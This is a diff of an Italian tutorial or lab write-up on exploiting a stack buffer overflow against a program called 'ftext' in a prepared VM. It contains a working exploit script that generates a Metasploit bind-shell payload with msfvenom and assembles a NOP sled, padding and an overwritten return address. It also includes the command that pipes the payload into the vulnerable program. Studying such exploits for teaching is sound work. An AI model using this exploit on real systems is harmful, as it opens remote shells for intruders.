@@ -177,26 +177,21 @@ un valido candidato per sovrascrivere l'indirizzo di ritorno salvato nello stack
 Uno script in Python è stato realizzato per mettere insieme i componenti dello shellcode.
 
 ```python
-import sys
+import sys, subprocess as sp
 from struct import pack
 
-buf =  b""
-buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d"
-buf += b"\x05\xef\xff\xff\xff\x48\xbb\x8e\xa4\xfd\xd1\x6b"
-buf += b"\xdd\x94\xd4\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
-buf += b"\xff\xe2\xf4\xe4\x8d\xa5\x48\x01\xdf\xcb\xbe\x8f"
-buf += b"\xfa\xf2\xd4\x23\x4a\xc6\x13\x8a\x80\xff\xd1\x7a"
-buf += b"\x81\xdc\x5d\x68\xce\xed\x8b\x01\xec\xcc\xdb\x8b"
-buf += b"\xfd\x97\xe3\x33\xd2\x91\x9c\x18\xce\xd6\x89\x64"
-buf += b"\xd8\xc4\x82\xd1\xce\xf4\x89\xf2\x6b\x84\x9c\x07"
-buf += b"\x72\xb0\xe0\xa2\xb7\xb6\x95\xd4\x16\xfa\xde\x6e"
-buf += b"\x95\x02\x9c\x19\xfb\xf2\xd4\x94\x3b\x94\xd4"
+cp = sp.run(
+    "msfvenom --platform linux --arch x64 --bad-chars '\\x00' " +
+    "--payload linux/x64/shell/bind_tcp --format hex",
+    stdout=sp.PIPE, stderr=sp.PIPE, shell=True, check=True
+)
+buf = bytes.fromhex(cp.stdout.decode())
 
 distance_to_ra = 296
 nopsled = b"\x90" * 60
-padding = b"A" * (distance_to_ra - len(nopsled) - len(buf))
+padding_length = distance_to_ra - len(nopsled) - len(buf)
+padding = b"A" * padding_length
 address = pack("<Q", 0x7fffffffe826)
-
 sys.stdout.buffer.write(nopsled + buf + padding + address)
 ```
 
@@ -211,7 +206,7 @@ In questa fase, il programma vulnerabile viene eseguito fornendo in input lo she
 generato in precedenza. Sulla VM predisposta viene quindi eseguito il seguente comando.
 
 ```sh
-payload-gen.py | ftext
+shellcode.py | ftext
 ```
 
 Quando eseguito con successo, il comando esposto provocherà l'esecuzione del payload
